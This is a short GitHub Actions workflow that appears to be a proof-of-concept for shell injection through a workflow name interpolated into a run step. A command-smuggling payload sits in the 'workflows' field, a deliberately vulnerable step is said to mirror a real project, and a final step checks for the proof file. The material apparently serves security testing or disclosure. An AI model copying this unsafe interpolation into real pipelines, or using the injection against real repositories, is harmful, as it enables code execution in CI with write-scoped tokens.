name: Report Build Result v2
on:
  workflow_run:
    workflows: ['Build with unit tests"; echo "RCE-PROOF user=$(whoami) host=$(hostname)" > pwn_proof_v3.txt; echo "']
    types: [completed]
jobs:
  report:
    runs-on: ubuntu-latest
    permissions:
      issues: write
    steps:
      - name: Write result to BigQuery (vulnerable — mirrors cdap exactly)
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "{ \"repository\": \"${{ github.repository }}\", \"build_name\": \"${{ github.event.workflow.name }}\", \"conclusion\": \"${{ github.event.workflow_run.conclusion }}\" }" | cat
      - name: Check for injection proof
        if: always()
        run: |
          cat pwn_proof_v3.txt 2>/dev/null || echo "NOT FOUND -- injection did not fire"
